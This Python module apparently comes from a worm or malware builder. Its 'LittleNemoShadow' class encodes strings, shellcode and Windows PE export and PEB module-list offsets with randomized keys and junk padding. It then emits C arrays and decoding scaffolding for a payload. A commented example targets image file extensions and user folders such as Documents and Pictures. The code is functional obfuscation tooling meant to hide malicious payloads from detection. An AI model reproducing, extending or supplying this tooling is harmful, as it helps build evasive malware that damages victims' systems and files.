import string
from random import randint, choice
from app.global_config import WORM_VARIABLE_DEFAULT_EMPTY_VALUE

class LittleNemoShadowItem:
    def __init__(self, master: object):
        self.__master = master
    
    def addItem(self, item_name: str, value: any) -> None:
        setattr(self, item_name, value)
    

class LittleNemoShadow:
    def __init__(self, key: str = None, power: int = None, str_key: str = None):
        self.char_temp = string.ascii_letters + string.digits
        if not power:
            self.power = 34
        else:
            self.power = int(power)
        if not key:
            self.key = "abcd"
        else:
            self.key = key
        if not str_key:
            self.str_key = self.key
        else:
            self.str_key = str_key
        self.trash_size = 6
        self._default_rva_pe_export_table = [0x3c, 0x88]
        self._default_in_memory_module_list = [0x60, 0x18, 0x20]

        self._var_stack_name = "raddr"
        self._var_heap_name = "addr"
        self._tabulator = "\t"

        self._default_key_size = 6
        self._default_power_size = 68
        self._default_char_label = string.ascii_letters + string.digits

        self.Items = LittleNemoShadowItem(self)
        self.ItemsAdd = self.Items.addItem

    
    def setKey(self, key: str) -> None:
        self.key = key
    
    def setPower(self, power: int) -> None:
        if isinstance(power, str):
            try:
                power = int(power)
            except:
                return
        self.power = power
    
    def setStrKey(self, key: str) -> None:
        self.str_key = key

    def genTrash(self, key: list, trash_size: int = None):
        if not trash_size:
            trash_size = self.trash_size
        trash_len = randint(trash_size, trash_size * 2)
        trash = []
        key_id = 0
        key_len = len(key)
        for _ in range(trash_len):
            if key_id == key_len:
                key_id = 0
            trash.append(ord(choice(self.char_temp)) + key[key_id])
            key_id += 1
        return trash
    

    def showKey(self, key: str = None, power: int = None) -> list:
        if not key:
            key = self.key
        if not power:
            power = self.power
        key_int = [ord(x) * power for x in key]
        key_int.append(0)
        return key_int
    
    def showKeyHex(self, key: str = None, power: int = None) -> str:
        rkey = self.showKey(key, power)
        hkey = [hex(c) for c in rkey]
        return ", ".join(hkey)
    
    def showKeyPart(self, part_no: int) -> int:
        rkey = self.showKey()
        return rkey[part_no]

    def shadow(self, text: str, key: str = None, power: int = None):
        if not power:
            power = self.power
        if not key:
            key = self.key
        text_size = len(text)
        key_int = [ord(x) * power for x in key]
        etext = []
        etext.append(text_size + key_int[0])
        key_id = 0
        key_size = len(key_int)
        for c in text:
            if key_id == key_size:
                key_id = 0
            etext.append(ord(c) + key_int[key_id])
            key_id += 1
        etext.extend(self.genTrash(key_int))
        return etext
    
    def shadowStr(self, text: str, key: str = None, power: int = None):
        sh_text = self.shadow(text, key, power)
        data = []
        for c in sh_text:
            data.append(hex(c))
        return ", ".join(data)

    def shadow_numbers(self, int_list: list,  key: str = None, power: int = None):
        if not key:
            key = self.key
        if not power:
            power = self.power
        text_size = len(int_list)
        key_int = [ord(x) * power for x in key]
        etext = []
        etext.append(text_size + key_int[0])
        key_id = 0
        key_size = len(key_int)
        for c in int_list:
            if key_id == key_size:
                key_id = 0
            etext.append(c + key_int[key_id])
            key_id += 1
        etext.extend(self.genTrash(key_int))
        return etext

    def shadowInt(self, int_list: list,  key: str = None, power: int = None):
        sh_int = self.shadow_numbers(int_list, key, power)
        data = []
        for c in sh_int:
            data.append(hex(c))
        return ", ".join(data)
    
    def genRvaExpTab(self, key: str = None, power: int = None) -> str:
        return self.shadowInt(self._default_rva_pe_export_table, key, power)
    
    def genInMemModList(self, key: str = None, power: int = None) -> str:
        return self.shadowInt(self._default_in_memory_module_list)
    
    def _add_code_list(self, shadow_text: str, counter: int) -> str:
        code = ""
        stack_name = f"{self._var_stack_name}{counter}"
        heap_name = f"{self._var_heap_name}{counter}"
        code += f"{self._tabulator}uint16_t {self._var_stack_name}{counter}[] = {{"
        code += shadow_text
        code += "};\n"
        code += f"{self._tabulator}uint16_t *{self._var_heap_name}{counter} = malloc(sizeof({self._var_stack_name}{counter}));\n"
        code += f"{self._tabulator}memset({heap_name}, 0, sizeof({stack_name}));\n"
        code += f"{self._tabulator}memcpy({heap_name}, {stack_name}, sizeof({stack_name}));\n"
        return code
    

    def shadowList(self, text_base: list, key: str = None, power: int = None):
        if not key:
            key = self.key
        if not power:
            power = self.power
        code = ""
        counter = 1
        database = []
        data_size = []
        for text in text_base:
            stext = self.shadowStr(text, key, power)
            section = self._add_code_list(stext, counter)
            code += section
            code += "\n"
            database.append(f"{self._var_heap_name}{counter}")
            data_size.append(f"sizeof({self._var_stack_name}{counter})")
            counter += 1
        code += f"{self._tabulator}uint16_t *all_addr[] = {{ "
        code += ", ".join(database)
        code += ", 0 };\n"

        code += f"{self._tabulator}uint16_t all_size[] = {{ "
        code += ", ".join(data_size)
        code += ", 0 };\n"
        
        return code
    
    def encodeString(self, text: str, key: str = None, power: int = None) -> str:
        if not key:
            key = self.str_key
        if not power:
            power = self.power
        key_int = [ord(x) * power for x in key]
        key_int.append(0)
        buff = []
        key_id = 0
        for c in text:
            if key_int[key_id] == 0:
                key_id = 0
            buff.append(hex(ord(c) + key_int[key_id]))
            key_id += 1
        return ", ".join(buff)
    
    def encodeShellcode(self, scode: str, key: str = None, power: int = None) -> str:
        scode = [int(b, 0) for b in scode.split(", ") if b != " " or b != ""]
        if not key:
            key = self.str_key
        if not power:
            power = self.power
        key_int = [ord(x) * power for x in key]
        key_int.append(0)
        buff = []
        key_id = 0
        for b in scode:
            if key_int[key_id] == 0:
                key_id = 0
            buff.append(hex(b + key_int[key_id]))
            key_id += 1
        return ", ".join(buff)
    
    def _generate_key(self, key_len: int) -> str:
        key = ""
        c = 0
        while c < key_len:
            key += choice(self._default_char_label)
            c += 1
        return key

    def randomizeShadow(self, key_len: int = None, power_size: int = None, randomize: int = 0) -> None:
        if not key_len:
            key_len = self._default_key_size
        if not power_size:
            power_size = self._default_power_size
        if randomize > 0:
            if int(randomize / 2) < 1:
                min_rand = 1
                max_rand = randomize * 2
            else:
                min_rand = int(randomize / 2)
                max_rand = randomize * 2
            key_len += randint(min_rand, max_rand)
            power_size += (randint(min_rand, max_rand) * randomize)
        self.key = self._generate_key(key_len)
        self.str_key = self._generate_key(key_len)
        self.power = power_size
    
    def morphKey(self, morph: int, key: str = None, power: int = None) -> str:
        if not key:
            key = self.str_key
        if not power:
            power = self.power
        key_int = [ord(x) * power for x in key]
        key_int.append(0)
        key_morph = []
        for k in key_int:
            if (k == 0):
                key_morph.append(hex(k))
            else:
                key_morph.append(hex(k + morph))
        return ", ".join(key_morph);
    
    def convertToList(self, text: str, separator: str) -> list:
        if text == WORM_VARIABLE_DEFAULT_EMPTY_VALUE:
            return []
        rtext = text.split(separator)
        rlist = []
        for x in rtext:
            if x == "" or x == " " or x == "\n":
                continue
            rlist.append(x.strip(" "))
        return rlist
    
    def _add_encode_part_list(self, shadow_text: str, counter: int) -> str:
        code = ""
        stack_name = f"{self._var_stack_name}{counter}"
        heap_name = f"{self._var_heap_name}{counter}"
        code += f"{self._tabulator}uint16_t {self._var_stack_name}{counter}[] = {{"
        code += shadow_text
        code += "};\n"
        # code += f"{self._tabulator}uint16_t *{self._var_heap_name}{counter} = malloc(sizeof({self._var_stack_name}{counter}));\n"
        return code
    
    def _add_empty_list(self) -> str:
        code = f"{self._tabulator}uint16_t *all_addr[] = {{0}};\n"
        code += f"{self._tabulator}uint16_t all_size[] = {{0}};\n"
        code += f"{self._tabulator}uint16_t data_size = 0;"
        return code

    def encodeList(self, str_list: list, str_key: str = None, power: int = None) -> str:
        if not str_key:
            str_key = self.str_key
        if not power:
            power = self.power
        if len(str_list) == 0:
            code = self._add_empty_list()
            return code
        code = ""
        counter = 1
        database = []
        data_size = []
        for text in str_list:
            stext = self.encodeString(text, str_key, power)
            section = self._add_encode_part_list(stext, counter)
            code += "\n" + section
            database.append(f"{self._var_stack_name}{counter}")
            data_size.append(f"sizeof({self._var_stack_name}{counter})")
            counter += 1

        code += f"{self._tabulator}uint16_t *all_addr[] = {{ "
        code += ", ".join(database)
        code += ", 0 };\n"

        code += f"{self._tabulator}uint16_t all_size[] = {{ "
        code += ", ".join(data_size)
        code += ", 0 };\n"
        code += f"{self._tabulator}int data_size = {counter - 1};\n"   
        
        return code

# LS = LittleNemoShadow("abcd", 34, "abcd")
# fext = [".jpg", ".gif", ".bmp"]
# fname = ["obrazek", "robbo", "janina", "ala", "ma", "kota", "ob1"]
# tar_dir = ["Documents", "Pictures", "programs", "mingw64"]
# LS.encodeList(fname)
